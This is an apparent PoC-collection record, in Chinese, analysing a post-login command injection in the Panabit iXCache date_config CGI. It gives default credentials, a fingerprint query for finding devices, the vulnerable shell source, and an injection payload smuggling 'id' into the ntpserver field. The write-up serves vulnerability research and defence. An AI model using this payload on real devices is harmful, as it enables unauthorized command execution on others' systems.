---
version: "Panabit iXCache"
source: "Threekiii/Awesome-POC"
id: "vw-71353ab56aa6b870fc3ac7de"
entity_id: "ve-30632cce8d7629049c572243"
schema_version: "1"
title: "Panabit iXCache date_config 后台命令执行漏洞"
product: "Panabit iXCache"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "后台operator_check，默认admin/ixcache或有效账户；版本缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Panabit/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复"
source_status: "unknown"
canonical: "Web安全/网络设备/Panabit/Panabit-iXCache-date_config-后台命令执行漏洞.md"
relation_type: "duplicate_of"
---

# Panabit iXCache date_config 后台命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit iXCache
- 本文讨论：date_config 写ntp.conf后source执行
- 版本、权限与配置前提：后台operator_check，默认admin/ixcache或有效账户；版本缺失
- 资料类型：源码分析/二阶段PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 源码支持配置文件写入后source执行，不是普通变量展开就再次解释分号，应以二次解释作为根因
- 会改变系统时间和NTP配置，需标副作用及还原
- 缺HTTP会话及版本，示例tz=Asiz可疑拼写但非核心触发参数

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 时间/NTP 设置会改变设备时钟及同步配置，可能影响日志、证书和业务；需记录原值并在隔离实验后恢复

### 待核与来源

- operator_check角色边界、固件/权限待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令

## 漏洞影响

```
Panabit iXCache
```

## 网络测绘

```
title="iXCache"
```

## 漏洞复现

登录页面

![image-20230314084931046](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314084931046.png)

默认账号密码为：admin/ixcache , 存在漏洞的模块为

```
/cgi-bin/Maintain/date_config
```

找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 userverify.cgi

![image-20230314085003951](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085003951.png)

接收请求参数的方式如下，通过快速搜索查找可能交互的地方

```
"${REQUEST_METHOD}" = "POST"
```

![image-20230314085018386](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085018386.png)

这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点

![image-20230314085054479](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085054479.png)

```
#!/bin/sh
#This script is created by ssparser automatically. The parser first created by MaoShouyan
printf "Content-type: text/html
Cache-Control: no-cache

"
echo -n ""; 
. ../common/common.sh
myself="/cgi-bin/Maintain/`basename $0`"

echo -n "
<script languate=\"javascript\">
function Validate(frm)
{
	frm.ntpserver.value = TrimAll(frm.ntpserver.value);
	if (frm.ntpserver.value != \"\" && !IsIPAddr(frm.ntpserver.value)) {
		alert(\"请输入IP地址!\");
		frm.ntpserver.select();
		return false;
	}
	return true;
}
</script>
";
if [ "${REQUEST_METHOD}" = "POST" ]; then
	operator_check "${myself}"
	[ "${CGI_ntpserver}" = "" ] && CGI_ntpserver="0.0.0.0"
	echo "ntpserver_ip=${CGI_ntpserver}" > ${PGETC}/ntp.conf
	timefmt="${CGI_year}${CGI_month}${CGI_day}${CGI_hour}${CGI_minute}.${CGI_second}"
	errmsg=`date ${timefmt}`
	[ "${CGI_ntpserver}" != "0.0.0.0" ] && ntpdate -t 10 ${CGI_ntpserver}
	
	afm_dialog_msg "操作成功!"
fi
year=`date "+%Y"`
month=`date "+%m"`
day=`date "+%d"`
hour=`date "+%H"`
minute=`date "+%M"`
second=`date "+%S"`
if [ -f ${PGETC}/ntp.conf ]; then
	. ${PGETC}/ntp.conf
	CGI_ntpserver="${ntpserver_ip}"
fi
[ "${CGI_ntpserver}" = "" ] && CGI_ntpserver="0.0.0.0"

echo -n "
<body>
"; cgi_show_title "系统管理->系统时间" 
echo -n "
<br>
<form method=post onsubmit=\"return Validate(this)\" action=\"${myself}\">
<table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\"#ffffff\">
<tr id=row1 height=22>
	<td width=40></td>
	<td width=90 align=left>NTP服务器</td>
	<td width=* align=left>
		<input type=text name=ntpserver style=\"width:120px\" value=\"${CGI_ntpserver}\"></input>&nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)</td>
</tr>
</table>
<br>
<table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\"#ffffff\">
<tr id=row1 height=22>
	<td width=40></td>
	<td width=90 align=left>年/月/日</td>
	<td width=* align=left>
	<select name=year style=\"width:60px\" value=${year}>
	";
		tmpvar=2000
		while [ ${tmpvar} -le 2020 ]; do
			if [ ${tmpvar} -eq ${year} ]; then
				echo "<option value=${tmpvar} selected>${tmpvar}</option>"
			else
				echo "<option value=${tmpvar}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>年
	<select name=month style=\"width:60px\" value=${month}>
	";
		tmpvar=1
		while [ ${tmpvar} -le 12 ]; do
			selected=""
			[ ${tmpvar} -eq ${month} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>月
	<select name=day style=\"width:60px\" value=${day}>
	";
		tmpvar=1
		while [ ${tmpvar} -le 31 ]; do
			selected=""
			[ ${tmpvar} -eq ${day} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>日</td>
</tr>
<tr id=row1>
	<td></td>
	<td align=left>时/分/秒</td>
	<td width=* align=left>
	<select name=hour value=0 style=\"width:60px\" value=${hour}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 23 ]; do
			selected=""
			[ ${tmpvar} -eq ${hour} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>时
	<select name=minute value=0 style=\"width:60px\" value=${minute}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 59 ]; do
			selected=""
			[ ${tmpvar} -eq ${minute} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>分
	<select name=second value=0 style=\"width:60px\" value=${second}>
	";
		tmpvar=0
		while [ ${tmpvar} -le 59 ]; do
			selected=""
			[ ${tmpvar} -eq ${second} ] && selected="selected"
			if [ ${tmpvar} -lt 10 ]; then
				echo "<option value=\"0${tmpvar}\" ${selected}>${tmpvar}</option>"
			else
				echo "<option value=\"${tmpvar}\" ${selected}>${tmpvar}</option>"
			fi
			tmpvar=$((${tmpvar} + 1))
		done
	
echo -n "</select>秒</td>
</tr>
</table>
<table style=\"width:700; border-bottom:1px #787882 solid; color:#0000ff\">
<tr><td align=right>&nbsp;</td></tr>
</table>
<table style=\"width:700\"> 
<tr>
        <td align=right><input type=submit style=\"width:70\" value=\"提交\"></input>
	<input type=hidden name=ifname value=\"fxp1\"></input></td>
</tr>
</table>
</form>
</table>
</center>
</body>
</html>
";
```

![image-20230314085113258](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085113258.png)

${CGI_ntpserver} 参数可以发现，受用户可控

![image-20230314085129884](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085129884.png)

主要位置注意这个代码位置

```
echo "ntpserver_ip=${CGI_ntpserver}" > ${PGETC}/ntp.conf
```

这里将参数写入 PGETC/ntp.conf 文件，查看文件位置，看一下变量 {PGETC} 配置

![image-20230314085219275](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085219275.png)

在 /etc 目录下找到了这个文件

![image-20230314085232050](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085232050.png)

继续向下看

![image-20230314085244308](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085244308.png)

可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下

![image-20230314085259742](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085259742.png)

构造请求

```
POST /cgi-bin/Maintain/date_config

ntpserver=0.0.0.0;id&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```

![image-20230314085313769](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085313769.png)

成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果

![image-20230314085338637](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085338637.png)

交互处可进行命令拼接造成注入

![image-20230314085353610](./.resource/PanabitiXCachedate_config后台命令执行漏洞/media/image-20230314085353610.png)


---

> 来源：Threekiii/Awesome-POC
